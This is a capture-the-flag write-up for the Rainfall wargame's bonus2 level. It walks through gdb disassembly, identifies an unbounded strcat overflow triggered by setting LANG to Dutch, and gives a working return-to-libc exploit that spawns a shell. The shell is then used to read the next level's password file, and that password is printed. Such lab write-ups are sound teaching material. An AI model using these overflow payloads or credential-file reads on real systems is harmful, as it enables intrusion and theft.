# Rainfall

## Bonus2

```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  memcmp
0x08048360  memcmp@plt
0x08048370  strcat
0x08048370  strcat@plt
0x08048380  getenv
0x08048380  getenv@plt
0x08048390  puts
0x08048390  puts@plt
0x080483a0  __gmon_start__
0x080483a0  __gmon_start__@plt
0x080483b0  __libc_start_main
0x080483b0  __libc_start_main@plt
0x080483c0  strncpy
0x080483c0  strncpy@plt
0x080483d0  _start
0x08048400  __do_global_dtors_aux
0x08048460  frame_dummy
0x08048484  greetuser   # <-----------
0x08048529  main        # <-----------
0x08048640  __libc_csu_init
0x080486b0  __libc_csu_fini
0x080486b2  __i686.get_pc_thunk.bx
0x080486c0  __do_global_ctors_aux
0x080486ec  _fini
```

```sh
(gdb) disas greetuser
   ...
   0x0804848a <+6>:     mov    0x8049988,%eax              # lang
   0x0804848f <+11>:    cmp    $0x1,%eax
   0x08048492 <+14>:    je     0x80484ba                   # lang == 1
   0x08048494 <+16>:    cmp    $0x2,%eax
   0x08048497 <+19>:    je     0x80484e9                   # lang == 2
   0x08048499 <+21>:    test   %eax,%eax
   0x0804849b <+23>:    jne    0x804850a
   0x0804849d <+25>:    mov    $0x8048710,%edx             # default greeting (short)
   ... copy to [ebp-0x48] ...
   0x080484ba <+54>:    mov    $0x8048717,%edx             # greeting lang 1 (longest)
   ... copy to [ebp-0x48] ...
   0x080484e9 <+101>:   mov    $0x804872a,%edx             # greeting lang 2
   ... copy to [ebp-0x48] ...
   0x0804850a <+134>:   lea    0x8(%ebp),%eax              # name (args on stack)
   0x08048511 <+141>:   lea    -0x48(%ebp),%eax            # greeting buf
   0x08048517 <+147>:   call   strcat@plt                  # strcat(greeting, name)
   0x08048522 <+158>:   call   puts@plt
   0x08048527 <+163>:   leave
   0x08048528 <+164>:   ret
   ```

   ```sh
  (gdb) disas main
   0x08048538 <+15>:    cmpl   $0x3,0x8(%ebp)              # argc == 3
   0x08048548 <+31>:    lea    0x50(%esp),%ebx             # buf
   0x08048551 <+40>:    mov    $0x13,%edx
   0x0804855a <+49>:    rep stos                          # zero 76 bytes
   0x08048564 <+59>:    movl   $0x28,0x8(%esp)
   0x08048577 <+78>:    call   strncpy@plt                 # strncpy(buf, argv[1], 40)
   0x08048584 <+91>:    movl   $0x20,0x8(%esp)
   0x08048594 <+107>:   add    $0x28,%eax
   0x0804859a <+113>:   call   strncpy@plt                 # strncpy(buf+40, argv[2], 32)
   0x0804859f <+118>:   movl   $0x8048738,(%esp)
   0x080485a6 <+125>:   call   getenv@plt                  # getenv("LANG")
   0x080485bc <+147>:   memcmp(..., 0x804873d, 2)          # "fi" ?
   0x080485df <+182>:   movl   $0x1,0x8049988
   0x080485eb <+194>:   memcmp(..., 0x8048740, 2)          # "nl" ?
   0x0804860e <+229>:   movl   $0x2,0x8049988
   0x0804861e <+245>:    mov    $0x13,%eax
   0x08048629 <+256>:   rep movsl                          # push 76 bytes as args
   0x0804862b <+258>:   call   greetuser
   ```

The program needs 2 args. 
Copies them into one name buffer (`strncpy 40 + 32`), then `greetuser` does `strcat(greeting, name)` with no bound.

LANG=nl selects the Dutch prefix. Prefix + name > 72 → overwrite `greetuser`’s `EIP`.
We use our cyclic pattern with LANG=nl → `EIP` at offset 23 of `argv[2]`

Same libc as level2:
```t
system     0xb7e6b060
"/bin/sh"  0xb7f8cc58
```

After the smash, system takes its argument from a slot that sits on bytes 4–7 of `argv[1]`.
```sh
argv[1] = DUMM + /bin/sh + pad
argv[2] = 23 A's + system
```

```sh
bonus2@RainFall:~$ export LANG=nl
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "DUMM" + "\x58\xcc\xf8\xb7" + "A"*42') $(python -c 'print "A"*23 + "\x60\xb0\xe6\xb7"')
Goedemiddag! DUMMX���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```